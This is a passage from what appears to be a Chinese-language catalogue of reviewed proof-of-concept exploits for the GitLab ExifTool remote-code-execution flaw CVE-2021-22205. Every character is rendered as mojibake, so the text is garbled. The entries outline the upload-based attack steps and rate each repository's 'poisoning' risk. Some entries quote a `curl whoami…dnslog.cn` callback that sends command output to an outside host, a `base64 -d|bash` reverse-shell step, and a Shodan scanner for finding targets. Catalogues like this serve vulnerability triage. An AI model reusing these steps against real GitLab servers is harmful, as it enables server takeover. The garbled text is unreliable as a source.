2.  ç„¶åŽï¼Œæ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚è¯¥æ–‡ä»¶ä¸­çš„ metadata å­—æ®µåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ `curl whoami.82sm53.dnslog.cn` æˆ–å…¶ä»–æ¶æ„æŒ‡ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ­¤ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚è¯·æ±‚å¤´ä¸­åŒ…å«ä¹‹å‰èŽ·å–çš„ CSRF tokenã€‚
4.  GitLab åœ¨å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼ŒExifTool ä¼šæ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„PoCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒï¼Œå…¶ä¸­åŒ…å«äº†æ¶æ„çš„ExifToolå…ƒæ•°æ®ï¼Œå¯ä»¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚PoCä»£ç é¦–å…ˆèŽ·å–CSRF Tokenï¼Œç„¶åŽæž„é€ åŒ…å«payloadçš„multipart/form-dataè¯·æ±‚ï¼Œå‘é€åˆ°`/uploads/user`ç«¯ç‚¹ã€‚å¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žä¸”æœªæ‰“è¡¥ä¸ï¼ŒPoCä¼šæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**
æä¾›çš„PoCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚ç»è¿‡åˆ†æžï¼Œä»£ç ä¸­æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æ¶æ„é€»è¾‘æˆ–åŽé—¨ã€‚ é£Žé™©è¾ƒä½Žï¼Œ ä½†æ˜¯å¹¶ä¸èƒ½æŽ’é™¤ä½œè€…åœ¨ä»£ç ä¸­éšè—äº†ä¸æ˜“å¯Ÿè§‰çš„æŠ•æ¯’ä»£ç ã€‚ä¾‹å¦‚é€šè¿‡ç½‘ç»œåŠ è½½æ¶æ„ä»£ç ç­‰ã€‚æ‰€ä»¥è¿™é‡Œè¯„ä¼°çš„æŠ•æ¯’é£Žé™©ä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [ccordeiro/CVE-2021-22205](https://github.com/ccordeiro/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #9

**æ¥æº**: [CVE-2021-22205-devdanqtuan_CVE-2021-22205.md](../2021/CVE-2021-22205-devdanqtuan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ GitLab å®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—® GitLab å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Tokenï¼Œè¯¥ Token å¯é€šè¿‡è®¿é—®ç™»å½•é¡µé¢èŽ·å¾—ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åˆ©ç”¨ ExifTool çš„æ¼æ´žï¼Œåœ¨è§£æžå…ƒæ•°æ®æ—¶æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…ä½¿ç”¨ multipart/form-data å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab çš„å¤´åƒä¸Šä¼ æŽ¥å£ `/uploads/user`ã€‚
4.  GitLab è°ƒç”¨ ExifTool è§£æžå›¾åƒæ–‡ä»¶ï¼ŒExifTool æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**

æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒæ¨¡æ‹Ÿäº†ä¸Šè¿°åˆ©ç”¨æµç¨‹ï¼Œèƒ½å¤ŸæˆåŠŸè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ã€‚POC é€šè¿‡æž„é€ æ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ï¼Œå°†å‘½ä»¤æ³¨å…¥åˆ° ExifTool å¯ä»¥è§£æžçš„å…ƒæ•°æ®ä¸­ã€‚ä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡åˆ°å­˜åœ¨æ¼æ´žçš„GitLabæœåŠ¡å™¨ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

ä»£ç æ•´ä½“æ˜¯ç”¨äºŽå¤çŽ°æ¼æ´žï¼Œä½†å­˜åœ¨å¾®å°çš„æŠ•æ¯’é£Žé™©ã€‚ä¸»è¦é£Žé™©ç‚¹åœ¨äºŽæ”»å‡»å‘½ä»¤çš„æž„é€ ä»¥åŠæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹`target_url`æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è€ƒè™‘åˆ°POCæœ¬èº«å°±æ˜¯æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ‰€ä»¥æ­£å¸¸ä½¿ç”¨åœºæ™¯ä¸‹æ˜¯æ²¡é—®é¢˜çš„ã€‚é™¤éžï¼Œæœ‰äººæ•…æ„é­”æ”¹æ­¤ä»£ç ï¼Œæˆ–è€…åœ¨æ‰¹é‡æµ‹è¯•æ—¶ï¼Œä½¿ç”¨è€…æœªæ£€æŸ¥urlï¼Œå¯èƒ½ä¼šæœ‰ä¸€å®šé£Žé™©ã€‚æ•…è®¤ä¸ºæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œçº¦ä¸º1%ã€‚

**ä¼˜å…ˆçº§:**

ç”±äºŽæœç´¢å¼•æ“Žæ²¡æœ‰æä¾›ç»“æžœï¼Œå› æ­¤ä¼˜å…ˆçº§ä¸ºæ¼æ´žåˆ©ç”¨ä»£ç  > æ¼æ´žåº“ä¿¡æ¯ã€‚

**é¡¹ç›®åœ°å€:** [devdanqtuan/CVE-2021-22205](https://github.com/devdanqtuan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #10

**æ¥æº**: [CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md](../2021/CVE-2021-22205-faisalfs10x_GitLab-CVE-2021-22205-scanner.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ä»Žæ”»å‡»è€…æŽ§åˆ¶çš„ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œè§¦å‘ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥ï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…å‘å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šä¼ æ¶æ„æž„é€ çš„ DjVu æˆ– JPG å›¾åƒæ–‡ä»¶ã€‚
2.  GitLab å°è¯•ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ–‡ä»¶ã€‚
3.  æ¶æ„æ–‡ä»¶ä¸­çš„å…ƒæ•°æ®ï¼ˆä¾‹å¦‚ï¼ŒCopyright å­—æ®µï¼‰åŒ…å«å‘½ä»¤æ³¨å…¥ä»£ç ã€‚
4.  ExifTool æ‰§è¡Œæ¶æ„ä»£ç ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**POCæœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ Python è„šæœ¬ `GitLab-revshell.py` åˆ©ç”¨äº†æ­¤æ¼æ´žæ¥èŽ·å¾—åå‘ shellã€‚å®ƒé¦–å…ˆæ£€æŸ¥ `djvumake` æ˜¯å¦å·²å®‰è£…ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºŽåˆ›å»º DjVu æ–‡ä»¶çš„å·¥å…·ã€‚ç„¶åŽï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåŒ…å«åµŒå…¥å¼å‘½ä»¤çš„ DjVu æ–‡ä»¶ï¼Œè¯¥å‘½ä»¤å°† base64 ç¼–ç çš„åå‘ shell å‘½ä»¤è§£ç å¹¶æ‰§è¡Œã€‚è¯¥è„šæœ¬é€šè¿‡ä¸Šä¼ è¯¥æ–‡ä»¶åˆ° GitLab å®žä¾‹çš„ `/uploads/user` ç«¯ç‚¹æ¥è§¦å‘æ¼æ´žã€‚å®ƒä½¿ç”¨ BeautifulSoup ä»Žç™»å½•é¡µé¢æå– CSRF token ä»¥ç»•è¿‡ CSRF ä¿æŠ¤ã€‚è„šæœ¬ä¼šæ£€æŸ¥ç›®æ ‡æ˜¯å¦å“åº”ï¼Œå¹¶å°è¯•å‘é€å¸¦æœ‰æ¶æ„æ–‡ä»¶çš„POSTè¯·æ±‚ï¼Œé€šè¿‡åˆ¤æ–­è¯·æ±‚æ˜¯å¦è¶…æ—¶ç¡®å®šshellæ˜¯å¦è¢«æˆåŠŸå»ºç«‹ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

ä»£ç åº“åŒ…å«ä¸‰ä¸ªæ–‡ä»¶ï¼š
*   `GitLab-revshell.py`: ä¸»è¦çš„æ¼æ´žåˆ©ç”¨è„šæœ¬ã€‚
*   `README.md`: åŒ…å«ä½¿ç”¨è¯´æ˜Žã€‚
*   `shodan-scanner.py`: ä½¿ç”¨ Shodan æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹çš„æ‰«æå™¨ã€‚

`shodan-scanner.py` è¦æ±‚ç”¨æˆ·æ’å…¥è‡ªå·±çš„ Shodan API å¯†é’¥ã€‚ è¯¥è„šæœ¬çš„ç›®çš„æ˜¯æ‰«æç›®æ ‡ã€‚`GitLab-revshell.py` è„šæœ¬åœ¨`/tmp`ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶ï¼Œå¯èƒ½ä¼šé€ æˆä¸€å®šç¨‹åº¦çš„åžƒåœ¾æ–‡ä»¶æ®‹ç•™,ä½†æ˜¯ä¸å±žäºŽæŠ•æ¯’è¡Œä¸ºã€‚

 æ½œåœ¨æŠ•æ¯’é£Žé™©ç‚¹åœ¨äºŽï¼Œå¦‚æžœæ”»å‡»è€…ä¿®æ”¹äº† `GitLab-revshell.py` è„šæœ¬ï¼Œæ·»åŠ äº†é¢å¤–åŠŸèƒ½ï¼Œä¾‹å¦‚æ”¶é›†ç›®æ ‡ä¿¡æ¯å¹¶å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ï¼Œæˆ–è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨ï¼Œé‚£ä¹ˆå°±å­˜åœ¨æŠ•æ¯’é£Žé™©ã€‚ä½†æ˜¯ä»Žæä¾›çš„è„šæœ¬æ¥çœ‹ï¼Œåªå®žçŽ°äº†åå‘shellçš„åŠŸèƒ½ï¼Œé¢å¤–çš„é£Žé™©è¾ƒä½Žã€‚æ‰€ä»¥æŠ•æ¯’é£Žé™©è¾ƒä½Žã€‚

ç»¼ä¸Šï¼Œ ç»¼åˆåˆ¤æ–­ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œé¢„ä¼°ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [faisalfs10x/GitLab-CVE-2021-22205-scanner](https://github.com/faisalfs10x/GitLab-CVE-2021-22205-scanner)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #11

**æ¥æº**: [CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md](../2021/CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool å‘½ä»¤æ³¨å…¥

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** å‘½ä»¤æ³¨å…¥

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8 || >=13.9, <13.9.6 || >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªGitLab CE/EEä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå­˜åœ¨äºŽ11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ä¸­ã€‚æ¼æ´žåŽŸå› æ˜¯GitLabåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶ï¼Œæœªæ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚POCä»£ç ä¸­ï¼Œä½¿ç”¨äº†`xxd`å‘½ä»¤å°†åå…­è¿›åˆ¶æ•°æ®è½¬æ¢æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶è¿½åŠ åˆ°åä¸º`1.jpg`çš„æ–‡ä»¶ä¸­ã€‚å…¶ä¸­ï¼Œè¿½åŠ çš„åå…­è¿›åˆ¶æ•°æ®ä¸­åŒ…å«äº†shellå‘½ä»¤ï¼Œæœ€ç»ˆå°†`xxx_base64_of_reverse_shell_code_xxx`è¿›è¡Œbase64è§£ç åŽæ‰§è¡Œã€‚
2.  æ”»å‡»è€…é€šè¿‡`curl`å‘½ä»¤ï¼Œæ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚POCä»£ç é€šè¿‡èŽ·å–ç”¨æˆ·çš„CSRF-Tokenï¼Œç„¶åŽåˆ©ç”¨/uploads/useræŽ¥å£ä¸Šä¼ ã€‚
3.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼Œç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´ExifToolæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
4.  POCä¸­ä½¿ç”¨äº†`base64 -d|bash` çš„æ–¹å¼æ‰§è¡Œpayloadã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

æä¾›çš„POCä»£ç ç›®çš„æ˜¯åˆ©ç”¨è¯¥æ¼æ´žå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè™½ç„¶æ‰§è¡Œäº†å¤–éƒ¨å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å‘çŽ°ä½œè€…åœ¨å…¶ä¸­éšè—å…¶ä»–æ¶æ„ä»£ç çš„è¡Œä¸ºã€‚ä»£ç æ¸…æ™°åœ°å±•ç¤ºäº†æ¼æ´žåˆ©ç”¨çš„è¿‡ç¨‹ï¼Œæ²¡æœ‰å‘çŽ°è¯•å›¾åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„è¿¹è±¡ã€‚è¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´žåˆ©ç”¨ï¼Œè€Œéžè¿›è¡Œå®žé™…çš„æ¶æ„æ”»å‡»ã€‚

å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [findneo/GitLab-preauth-RCE_CVE-2021-22205](https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #12

**æ¥æº**: [CVE-2021-22205-hh-hunter_cve-2021-22205.md](../2021/CVE-2021-22205-hh-hunter_cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®GitLabå®žä¾‹ï¼Œç›®æ ‡å®žä¾‹ä½¿ç”¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä¸Šä¼ å›¾ç‰‡ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabå¯¹ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰çš„æ ¡éªŒä¸ä¸¥æ ¼ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æž„é€ æ¶æ„çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä¸»è¦ç”¨äºŽæ­å»ºå­˜åœ¨æ¼æ´žå’Œä¸å­˜åœ¨æ¼æ´žçš„çŽ¯å¢ƒï¼Œç”¨äºŽéªŒè¯æ¼æ´žçš„ä¿®å¤æ•ˆæžœã€‚docker-compose-vulnerability.yml ä½¿ç”¨äº†13.9.5-ee.0ç‰ˆæœ¬ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¯ä»¥éªŒè¯æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä»…ä»…ç”¨äºŽæž„å»ºçŽ¯å¢ƒï¼Œæ²¡æœ‰å‘çŽ°æ¶æ„ä»£ç ï¼ŒæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„å‘½ä»¤çš„Exifå…ƒæ•°æ®çš„å›¾ç‰‡æ–‡ä»¶ï¼‰åˆ°GitLabæœåŠ¡å™¨ã€‚GitLabä½¿ç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œå›¾ç‰‡ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ã€‚
2.  å°†è¯¥å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°GitLabæœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®logoä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLabæœåŠ¡å™¨è°ƒç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  æ”»å‡»è€…é€šè¿‡æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [hh-hunter/cve-2021-22205](https://github.com/hh-hunter/cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #13

**æ¥æº**: [CVE-2021-22205-hhhotdrink_CVE-2021-22205.md](../2021/CVE-2021-22205-hhhotdrink_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦ä½äºŽå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼‰æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žæ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å·²è¢«å…¬å¼€åˆ©ç”¨ã€‚CISA å·²å°†å…¶æ·»åŠ åˆ°å·²çŸ¥è¢«åˆ©ç”¨çš„æ¼æ´žç›®å½•ä¸­ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„ Python è„šæœ¬ `22205exp.py` åŒ…å«æ¼æ´žéªŒè¯å’Œåˆ©ç”¨ä»£ç ã€‚ è¯¥è„šæœ¬åˆ©ç”¨ `dnslog.cn` æ¥éªŒè¯å‘½ä»¤æ‰§è¡Œã€‚ è™½ç„¶ `dnslog.cn` æ˜¯ä¸€ç§å¸¸è§çš„æ¼æ´žéªŒè¯æ–¹æ³•ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶ `dnslog.cn`ï¼Œåˆ™å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œä»–ä»¬å¯ä»¥è®°å½•æ¼æ´žåˆ©ç”¨ä¿¡æ¯ã€‚ åŒæ—¶ï¼Œè„šæœ¬ä¸­ä½¿ç”¨äº†ç¡¬ç¼–ç çš„User-Agentå’ŒContent-Typeï¼Œè¿™å¢žåŠ äº†è„šæœ¬è¢«è¯†åˆ«å’Œé˜²å¾¡çš„å¯èƒ½æ€§ã€‚å¦‚æžœæ”»å‡»è€…ä¿®æ”¹è¿™äº›å‚æ•°ï¼Œå¯èƒ½ä¼šå¢žåŠ æ”»å‡»çš„æˆåŠŸçŽ‡ï¼Œä½†ä¹Ÿå¯èƒ½è¢«è§†ä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºã€‚ æ­¤å¤–ï¼Œè¯¥è„šæœ¬ä¾èµ–äºŽ `beautifulsoup4` å’Œ `requests` åº“ã€‚ 